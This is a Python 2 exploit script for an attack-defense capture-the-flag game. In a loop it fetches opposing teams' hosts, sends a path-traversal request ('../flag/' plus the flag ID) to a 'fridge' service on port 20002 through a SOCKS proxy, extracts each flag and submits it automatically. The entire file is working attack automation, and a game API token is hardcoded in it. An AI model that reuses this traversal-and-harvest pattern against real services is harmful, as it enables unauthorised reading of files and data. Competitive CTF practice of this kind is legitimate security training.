#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import json
from swpag_client import Team # pip install swpag_client
import socks # pip install PySocks
import socket
from pwn import *
import time


def hostToIP(host):
	num = int(host.replace("team",""))
	part = "{0}.{1}".format(129+((num&0xff00)>>8),(num&0xff))
	return "172.31."+part

def runJob(d):
	# any stdout in here gets redirected to the log file
	# you can check this log by either looking at the log file (same directory),
	# or by using the command 'print <job name> [number of lines]' in the launcher

	try:
		s = remote(hostToIP(d['hostname']), 20002, timeout=0.05)
	except:
		return ""


	data = {}
	data['service'] = "fridge"
	data['op'] = 'getfridge'
	data['item'] = "../flag/"+d['flag_id']

	s.sendline(json.dumps(data))
	try:
		flag = s.recvuntil("\n").strip()
	except EOFError:
		return False

	try:
		flag = flag.split("\"content\":\"")[1].split("\n")[0]
	except IndexError:
		return False

	print flag.split("\\n")[1]

	return flag.split("\\n")[1]
 
def fakeJob(ip):
	return True # Return anything not False here

'''
	   {
           'team_name' : "Team name",
           'hostname' : "hostname",
           'port' : <int port number>,
           'flag_id' : "Flag ID to steal",
           'team_id': <int team id>
       },
'''

if __name__ == "__main__":
	context.proxy=(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4444)
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4444)
	socket.socket = socks.socksocket
	while(1):
		while(1):
   			try:
   				t = Team(None, "muVraUlLU7m0MM9dmg4P4auy59t5PFdg")
   				break
   			except:
   				pass
		targets = t.get_targets("fantasticiot")
		for target in targets:
			flag = runJob(target)
			if (flag):
				t.submit_flag([flag])
		print "Waiting for next round plz"
		time.sleep(60)



